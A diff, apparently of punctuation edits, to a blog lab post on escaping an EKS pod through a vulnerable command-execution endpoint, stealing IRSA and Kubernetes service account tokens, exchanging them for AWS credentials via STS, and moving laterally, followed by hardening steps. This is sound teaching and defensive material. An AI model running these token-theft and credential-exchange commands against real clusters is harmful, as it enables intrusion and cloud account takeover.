@@ -1,6 +1,6 @@
 ---
 layout: post
-title: "Lab — Kubernetes Pod Escape and IRSA Abuse: From Container to AWS Account"
+title: "Lab: Kubernetes Pod Escape and IRSA Abuse: From Container to AWS Account"
 date: 2026-06-28T10:00:00
 categories:
   - AWS Security Labs
@@ -16,7 +16,7 @@ tags:
   - cloud-attack
   - lab
 author: muhammed
-description: A hands-on lab demonstrating how to escape a Kubernetes pod, steal the service account token, abuse IRSA to call AWS APIs, and escalate from a container to full AWS account access — then harden with RBAC, network policy, and scoped IRSA roles.
+description: A hands-on lab demonstrating how to escape a Kubernetes pod, steal the service account token, abuse IRSA to call AWS APIs, and escalate from a container to full AWS account access - then harden with RBAC, network policy, and scoped IRSA roles.
 toc: true
 pin: false
 math: false
@@ -43,7 +43,7 @@ It is an AWS account problem.
 
 Every pod in EKS can be granted an IAM role via IRSA.
 The IAM credentials are delivered as a projected service account token mounted inside the pod at `/var/run/secrets/eks.amazonaws.com/serviceaccount/token`.
-If the pod is compromised — via a vulnerable application, a misconfigured admission controller, or a supply chain issue — the attacker has AWS credentials.
+If the pod is compromised - via a vulnerable application, a misconfigured admission controller, or a supply chain issue - the attacker has AWS credentials.
 
 The difference from EC2 IMDS: there is no IMDSv2 equivalent for Kubernetes.
 If the token is mounted, it is readable by any process in the pod.
@@ -86,12 +86,12 @@ EKS Cluster: lab-cluster
 
 ---
 
-## Phase 0 — Setup
+## Phase 0: Setup
 
-### Step 0.1 — Create an EKS Cluster
+### Step 0.1: Create an EKS Cluster
 
 ```bash
-# Using eksctl — simplest way to get a cluster
+# Using eksctl: simplest way to get a cluster
 eksctl create cluster \
   --name lab-cluster \
   --region eu-west-1 \
@@ -106,7 +106,7 @@ kubectl get nodes
 
 > 📸 **SCREENSHOT:** `kubectl get nodes` showing 2 nodes in Ready state
 
-### Step 0.2 — Enable IRSA on the Cluster
+### Step 0.2: Enable IRSA on the Cluster
 
 ```bash
 # Create the IAM OIDC provider for the cluster
@@ -123,7 +123,7 @@ aws eks describe-cluster \
 # e.g. https://oidc.eks.eu-west-1.amazonaws.com/id/EXAMPLED539D4633E53DE1B716D3041E
 ```
 
-### Step 0.3 — Create the Overprivileged IRSA Role
+### Step 0.3: Create the Overprivileged IRSA Role
 
 ```bash
 ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
@@ -155,7 +155,7 @@ aws iam create-role \
   --role-name eks-web-app-role \
   --assume-role-policy-document file://irsa-trust.json
 
-# Overprivileged — real world misconfiguration
+# Overprivileged: real world misconfiguration
 aws iam attach-role-policy \
   --role-name eks-web-app-role \
   --policy-arn arn:aws:iam::aws:policy/AmazonS3FullAccess
@@ -165,7 +165,7 @@ aws iam attach-role-policy \
   --policy-arn arn:aws:iam::aws:policy/IAMReadOnlyAccess
 ```
 
-### Step 0.4 — Deploy the Vulnerable Application
+### Step 0.4: Deploy the Vulnerable Application
 
 ```yaml
 # vulnerable-app.yaml
@@ -253,10 +253,10 @@ curl "http://$APP_IP:8080/run?cmd=id"
 
 ---
 
-## Phase 1 — Exploit the Vulnerable Application
+## Phase 1: Exploit the Vulnerable Application
 
 The `/run` endpoint executes arbitrary commands.
-This simulates RCE from a vulnerable web application — unpatched framework, injection vulnerability, or deserialization flaw.
+This simulates RCE from a vulnerable web application - unpatched framework, injection vulnerability, or deserialization flaw.
 
 ```bash
 # Confirm command execution
@@ -264,17 +264,17 @@ curl "http://$APP_IP:8080/run?cmd=hostname"
 # Returns: web-app-7d9f8b-xk2p4
 
 curl "http://$APP_IP:8080/run?cmd=whoami"
-# Returns: root  (running as root — another misconfiguration)
+# Returns: root  (running as root: another misconfiguration)
 
 # Check the environment
 curl "http://$APP_IP:8080/run?cmd=env"
 ```
 
-> 📸 **SCREENSHOT:** curl output showing environment variables — note AWS_WEB_IDENTITY_TOKEN_FILE and AWS_ROLE_ARN are visible
+> 📸 **SCREENSHOT:** curl output showing environment variables - note AWS_WEB_IDENTITY_TOKEN_FILE and AWS_ROLE_ARN are visible
 
 ---
 
-## Phase 2 — Read the IRSA Token
+## Phase 2: Read the IRSA Token
 
 IRSA credentials are delivered differently from EC2 IMDS.
 Instead of an HTTP endpoint, they are mounted as files inside the pod.
@@ -284,11 +284,11 @@ Instead of an HTTP endpoint, they are mounted as files inside the pod.
 curl "http://$APP_IP:8080/run?cmd=ls+/var/run/secrets/eks.amazonaws.com/serviceaccount/"
 # Returns: token
 
-# Read the IRSA token — a JWT
+# Read the IRSA token: a JWT
 curl "http://$APP_IP:8080/run?cmd=cat+/var/run/secrets/eks.amazonaws.com/serviceaccount/token"
 ```
 
-Output — a long JWT string:
+Output - a long JWT string:
 
 ```
 eyJhbGciOiJSUzI1NiIsImtpZCI6Ii4uLiJ9.eyJhdWQiOlsic3RzLmFtYXpvbmF3cy5jb20iXSwiZXhwIjoxNzUyMTUyNjU3...
@@ -300,14 +300,14 @@ Also read the Kubernetes service account token (separate from IRSA):
 curl "http://$APP_IP:8080/run?cmd=cat+/var/run/secrets/kubernetes.io/serviceaccount/token"
 ```
 
-This second token is used to call the Kubernetes API — useful for lateral movement within the cluster.
+This second token is used to call the Kubernetes API - useful for lateral movement within the cluster.
 
-> 📸 **SCREENSHOT:** The IRSA JWT token read from the pod — highlight that it is a real AWS credential exchange token
+> 📸 **SCREENSHOT:** The IRSA JWT token read from the pod - highlight that it is a real AWS credential exchange token
 
 ### Decode the JWT to Understand Its Claims
 
 ```bash
-# Decode the JWT payload (base64 — middle section between the dots)
+# Decode the JWT payload (base64: middle section between the dots)
 TOKEN="eyJhbGciOiJSUzI1NiIsImtpZCI6Ii4uLiJ9.eyJhdWQi..."
 echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool
 ```
@@ -336,12 +336,12 @@ AWS STS validates this against the IRSA trust policy and issues credentials if i
 
 ---
 
-## Phase 3 — Exchange Token for AWS Credentials
+## Phase 3: Exchange Token for AWS Credentials
 
 Copy the token to your attacker machine and call STS directly:
 
 ```bash
-# On attacker machine — exchange the IRSA token for AWS credentials
+# On attacker machine: exchange the IRSA token for AWS credentials
 IRSA_TOKEN="eyJhbGciOiJSUzI1NiIsImtpZCI6Ii4uLiJ9..."
 ROLE_ARN="arn:aws:iam::ACCOUNT_ID:role/eks-web-app-role"
 
@@ -351,7 +351,7 @@ aws sts assume-role-with-web-identity \
   --web-identity-token $IRSA_TOKEN
 ```
 
-Output — full AWS credentials:
+Output - full AWS credentials:
 
 ```json
 {
@@ -393,7 +393,7 @@ The IRSA credentials are being used from an IP that is not within the EKS cluste
 
 ---
 
-## Phase 4 — Lateral Movement Within the Cluster
+## Phase 4: Lateral Movement Within the Cluster
 
 The Kubernetes service account token (different from the IRSA token) lets you call the Kubernetes API.
 
@@ -404,7 +404,7 @@ K8S_TOKEN=$(curl "http://$APP_IP:8080/run?cmd=cat+/var/run/secrets/kubernetes.io
 # Get the API server address
 API_SERVER=$(curl "http://$APP_IP:8080/run?cmd=echo+\$KUBERNETES_SERVICE_HOST")
 
-# Call the Kubernetes API — list all pods in the namespace
+# Call the Kubernetes API: list all pods in the namespace
 curl -s -k \
   -H "Authorization: Bearer $K8S_TOKEN" \
   "https://$API_SERVER/api/v1/namespaces/production/pods"
@@ -428,9 +428,9 @@ curl -s -k \
 
 ---
 
-## Phase 5 — Hardening
+## Phase 5: Hardening
 
-### Fix 1 — Disable Automatic Service Account Token Mounting
+### Fix 1: Disable Automatic Service Account Token Mounting
 
 If the application does not need to call the Kubernetes API, disable the auto-mount entirely:
 
@@ -453,12 +453,12 @@ spec:
       serviceAccountName: web-app-sa
 ```
 
-IRSA tokens are mounted separately by the EKS pod identity webhook — disabling `automountServiceAccountToken` removes the Kubernetes API token but keeps the IRSA token.
+IRSA tokens are mounted separately by the EKS pod identity webhook - disabling `automountServiceAccountToken` removes the Kubernetes API token but keeps the IRSA token.
 To remove IRSA as well, do not annotate the service account with the role ARN.
 
 ---
 
-### Fix 2 — Run as Non-Root
+### Fix 2: Run as Non-Root
 
 ```yaml
 spec:
@@ -481,7 +481,7 @@ Non-root with dropped capabilities limits what the attacker can do even after ge
 
 ---
 
-### Fix 3 — Scope the IRSA Role to Least Privilege
+### Fix 3: Scope the IRSA Role to Least Privilege
 
 Replace `AmazonS3FullAccess` with a scoped policy:
 
@@ -510,11 +510,11 @@ aws iam attach-role-policy \
   --policy-arn arn:aws:iam::ACCOUNT_ID:policy/web-app-s3-policy
 ```
 
-Remove `IAMReadOnlyAccess` entirely — a web app has no reason to enumerate IAM.
+Remove `IAMReadOnlyAccess` entirely - a web app has no reason to enumerate IAM.
 
 ---
 
-### Fix 4 — Network Policy to Block Unexpected Egress
+### Fix 4: Network Policy to Block Unexpected Egress
 
 Block all egress except what the app needs:
 
@@ -546,14 +546,14 @@ spec:
               app: database
       ports:
         - port: 5432
-    # Block everything else — including reverse shells on port 4444
+    # Block everything else - including reverse shells on port 4444
 ```
 
-This does not prevent IRSA token theft — but it prevents the attacker from using the pod as a reverse shell callback or exfiltrating data to arbitrary endpoints.
+This does not prevent IRSA token theft - but it prevents the attacker from using the pod as a reverse shell callback or exfiltrating data to arbitrary endpoints.
 
 ---
 
-### Fix 5 — Enable GuardDuty EKS Protection
+### Fix 5: Enable GuardDuty EKS Protection
 
 GuardDuty has a dedicated EKS audit log monitoring feature:
 
@@ -581,11 +581,11 @@ With EKS protection enabled, GuardDuty fires on:
 
 ## Key Takeaways
 
-- IRSA tokens are mounted as files — any process with file read access inside the pod can steal them
-- The token exchange with STS happens outside the cluster — GuardDuty detects the credentials being used from an unexpected IP
-- Disabling `automountServiceAccountToken` removes the Kubernetes API lateral movement vector — but IRSA tokens are separate and controlled by pod annotations
-- Least privilege on the IAM role is the most impactful defense — a stolen token for a role with only `s3:GetObject` on one prefix causes far less damage than `S3FullAccess`
-- Run containers as non-root with read-only filesystems — limits what an attacker can do after RCE, and makes IRSA token files harder to read without explicit file read capabilities
+- IRSA tokens are mounted as files - any process with file read access inside the pod can steal them
+- The token exchange with STS happens outside the cluster - GuardDuty detects the credentials being used from an unexpected IP
+- Disabling `automountServiceAccountToken` removes the Kubernetes API lateral movement vector - but IRSA tokens are separate and controlled by pod annotations
+- Least privilege on the IAM role is the most impactful defense - a stolen token for a role with only `s3:GetObject` on one prefix causes far less damage than `S3FullAccess`
+- Run containers as non-root with read-only filesystems - limits what an attacker can do after RCE, and makes IRSA token files harder to read without explicit file read capabilities
 
 ---
 
